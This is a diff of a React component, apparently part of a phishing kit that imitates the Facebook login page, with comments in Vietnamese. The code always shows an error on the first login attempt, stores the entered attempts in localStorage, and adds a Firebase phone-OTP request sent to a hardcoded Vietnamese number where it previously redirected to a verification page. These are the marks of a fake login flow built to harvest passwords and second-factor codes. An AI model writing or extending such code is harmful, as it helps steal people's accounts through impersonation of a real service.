@@ -1,6 +1,7 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
+import { auth, setupRecaptcha, signInWithPhoneNumber } from "../../firebaseConfig.js";
 import "./Facebook.css";
 
 export default function FacebookLogin() {
@@ -14,8 +15,11 @@ export default function FacebookLogin() {
 
   const [attempts, setAttempts] = useState([]);
   const [showError, setShowError] = useState(false);
+  useEffect(() => {
+    setupRecaptcha();
+  }, []);
 
-  const onSubmit = (data) => {
+  const onSubmit = async (data) => {
     if (attempts.length === 0) {
       // Lần nhập đầu tiên
       setShowError(true);
@@ -28,7 +32,21 @@ export default function FacebookLogin() {
       localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
 
       // Chuyển sang trang verify
-      navigate("/verify");
+      // navigate("/verify");
+
+      try {
+        // const appVerifier = window.recaptchaVerifier;
+        // if (!appVerifier) {
+        //   alert("reCAPTCHA chưa được khởi tạo, vui lòng thử lại!");
+        //   return;
+        // }
+        const confirmationResult = await signInWithPhoneNumber(auth, "+84386426150", window.recaptchaVerifier);
+        console.log(confirmationResult);
+        alert("OTP đã được gửi!");
+      } catch (error) {
+        console.error("Lỗi gửi OTP:", error);
+        alert("Gửi OTP thất bại, thử lại sau!");
+      }
     }
   };
 
